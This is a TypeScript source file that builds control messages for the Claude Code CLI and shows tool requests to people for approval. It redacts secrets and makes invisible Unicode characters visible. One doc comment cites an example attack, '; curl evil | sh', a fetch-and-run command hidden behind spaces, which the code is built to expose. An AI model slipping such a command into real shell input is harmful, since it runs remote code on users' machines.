export function userLine(text: string, opts: { uuid?: string; priority?: 'next' | 'later'; images?: RawImage[]; imagesFirst?: boolean } = {}): string {
  const images = opts.images ?? [];
  const pictures = images.map((i) => ({ type: 'image', source: { type: 'base64', media_type: i.mediaType, data: i.dataBase64 } }));
  const words = text.trim() ? [{ type: 'text', text }] : [];
  const content = images.length ? (opts.imagesFirst ? [...pictures, ...words] : [...words, ...pictures]) : text;
  const msg: Record<string, unknown> = { type: 'user' };
  if (opts.uuid) msg.uuid = opts.uuid;
  if (opts.priority) msg.priority = opts.priority;
  msg.message = { role: 'user', content };
  return line(msg);
}

/** Allow a tool. `updatedInput` is omitted on purpose, so the CLI runs the input it holds (PRD §10.3). */
export const allowResponse = (requestId: string): string =>
  line({ type: 'control_response', response: { subtype: 'success', request_id: requestId, response: { behavior: 'allow' } } });

/** Deny a tool, with a message shown to the agent. */
export const denyResponse = (requestId: string, message: string): string =>
  line({ type: 'control_response', response: { subtype: 'success', request_id: requestId, response: { behavior: 'deny', message } } });

/** Refuse a control_request whose subtype we don't support. */
export const errorResponse = (requestId: string, error: string): string =>
  line({ type: 'control_response', response: { subtype: 'error', request_id: requestId, error } });

/** A control request; Claude Code answers with a `control_response` carrying the same `request_id`. */
export const controlRequest = (requestId: string, subtype: string, fields: Record<string, unknown> = {}): string =>
  line({ type: 'control_request', request_id: requestId, request: { ...fields, subtype } });

/** Interrupt the running turn. */
export const interruptRequest = (uuid: string): string => controlRequest(uuid, 'interrupt');

/** `apply_flag_settings` settings, built only from the allowlisted keys — never a caller's raw settings. */
export function flagSettings(input: { effort?: unknown; ultracode?: unknown }): { effortLevel?: string; ultracode?: boolean } {
  const settings: { effortLevel?: string; ultracode?: boolean } = {};
  if (typeof input.effort === 'string') settings.effortLevel = input.effort;
  if (typeof input.ultracode === 'boolean') settings.ultracode = input.ultracode;
  return settings;
}

/* ---------- Request summaries (redacted, short) ---------- */

const TITLES: Record<string, string> = {
  Bash: 'Run a command',
  Write: 'Write a file',
  Edit: 'Edit a file',
  MultiEdit: 'Edit a file',
  NotebookEdit: 'Edit a notebook',
  Read: 'Read a file',
};

/** A short human title for a tool request, e.g. "Run a command" for Bash. */
export function requestTitle(toolName: string | null): string {
  if (!toolName) return 'Use a tool';
  return TITLES[toolName] ?? `Use ${toolName}`;
}

const MAX_DETAIL = 200;

/**
 * A short one-line summary of a tool's input (never the whole blob), redacted where it's stored: for
 * approval cards and the transcript's tool rows. Null for unknown tools.
 */
export function requestDetail(toolName: string | null, input: unknown): string | null {
  const o = asObj(input);
  if (!o) return null;
  let detail: string | null;
  switch (toolName) {
    case 'Bash':
      detail = asStr(o.command);
      break;
    case 'Write':
    case 'Edit':
    case 'MultiEdit':
    case 'NotebookEdit':
    case 'Read':
      detail = asStr(o.file_path) ?? asStr(o.notebook_path);
      break;
    case 'Glob':
    case 'Grep':
      detail = asStr(o.pattern);
      break;
    case 'LS':
      detail = asStr(o.path);
      break;
    case 'WebFetch':
      detail = asStr(o.url);
      break;
    case 'WebSearch':
      detail = asStr(o.query);
      break;
    case 'Task':
    case 'Agent':
      detail = asStr(o.description);
      break;
    default:
      return null; // unknown tools: don't risk echoing secrets from an unrecognised shape
  }
  if (detail === null) return null;
  return clean(detail.replace(/\s+/g, ' ').trim(), MAX_DETAIL);
}

/** How much of a tool's input is looked at at all: eight times what is kept, so a credential or a character that matters cannot sit past it. */
const REQUEST_FULL_RAW_MAX = REQUEST_FULL_MAX * 8;

/**
 * Characters that can make text read as something else, or not read at all, shown as `⟦U+XXXX⟧` instead: control characters (but not
 * the newline and the tab), the bidirectional overrides and isolates, the zero-width and invisible ones, the line and paragraph
 * separators. A person deciding on a command must see the bytes they are deciding on.
 */
// eslint-disable-next-line no-control-regex
const DISGUISE = /[\u0000-\u0008\u000B-\u001F\u007F-\u009F\u00AD\u034F\u061C\u115F\u1160\u17B4\u17B5\u180B-\u180E\u200B-\u200F\u2028-\u202E\u2060-\u2064\u2066-\u206F\u3164\uFE00-\uFE0F\uFEFF\uFFA0\u{E0000}-\u{E007F}]/gu;
const visibly = (text: string): string => text.replace(DISGUISE, (c) => `⟦U+${(c.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(4, '0')}⟧`);

/** A tool's whole input as readable text, for a tool the portal has no summary of; null when there is no input to show. */
function inputAsJson(input: unknown): string | null {
  const o = asObj(input);
  if (!o) return null;
  try {
    return JSON.stringify(o, null, 2);
  } catch {
    return null;
  }
}

/**
 * What a person is asked to allow, whole, for the approval card and the glance widget (chat-sessions PRD, approvals): the command of
 * Bash; the path of the file tools; the URL, query, pattern or description of the others; the plan of ExitPlanMode; and for any other tool
 * (an MCP tool, say), or one whose field is not in its input, the whole input as JSON, so nothing is allowed that cannot be read. NOT folded like {@link requestDetail}: a run of
 * spaces that pushes `; curl evil | sh` out of sight stays a run of spaces, in a block that wraps and scrolls. Redacted whole before it is
 * cut, so a cut never splits a credential; cut at `REQUEST_FULL_MAX`, with `cut` saying so. Null when the tool's input has nothing to show.
 * The file tools' contents are not part of it (the Diff panel shows what changed).
 */
export function requestFull(toolName: string | null, input: unknown): { text: string; cut: boolean } | null {
  const o = asObj(input);
  let text: string | null;
  switch (toolName) {
    case 'Bash':
      text = asStr(o?.command);
      break;
    case 'Write':
    case 'Edit':
    case 'MultiEdit':
    case 'NotebookEdit':
    case 'Read':
      text = asStr(o?.file_path) ?? asStr(o?.notebook_path);
      break;
    case 'Glob':
    case 'Grep':
      text = asStr(o?.pattern);
      break;
    case 'LS':
      text = asStr(o?.path);
      break;
    case 'WebFetch':
      text = asStr(o?.url);
      break;
    case 'WebSearch':
      text = asStr(o?.query);
      break;
    case 'Task':
    case 'Agent':
      text = asStr(o?.description);
      break;
    case 'ExitPlanMode':
      text = asStr(o?.plan);
      break;
    default:
      text = null;
  }
  // A tool the portal has no field for, or a known one whose field is not there (Claude Code renamed it, say): the whole input, so
  // that whatever it is asked to run is still in front of the person.
  text ??= inputAsJson(input);
  if (text === null) return null;
  // A pathological input (megabytes of a heredoc) is bounded before it is scanned: far past the cap, so that nothing the cap keeps depends on it.
  const rawCut = text.length > REQUEST_FULL_RAW_MAX;
  const shown = redact(visibly(rawCut ? text.slice(0, REQUEST_FULL_RAW_MAX) : text));
  if (!rawCut && shown.length <= REQUEST_FULL_MAX) return { text: shown, cut: false };
  // A cut never leaves half a character: drop a high surrogate left at the end.
  let end = Math.min(REQUEST_FULL_MAX, shown.length);
  const last = shown.charCodeAt(end - 1);
  if (last >= 0xd800 && last <= 0xdbff) end--;
  return { text: shown.slice(0, end), cut: true };
}

/** Stringify a tool_result's content, redacted and kept short for the transcript row. */
function shortText(v: unknown): string {
  return clean(typeof v === 'string' ? v : JSON.stringify(v ?? ''), 500);
}
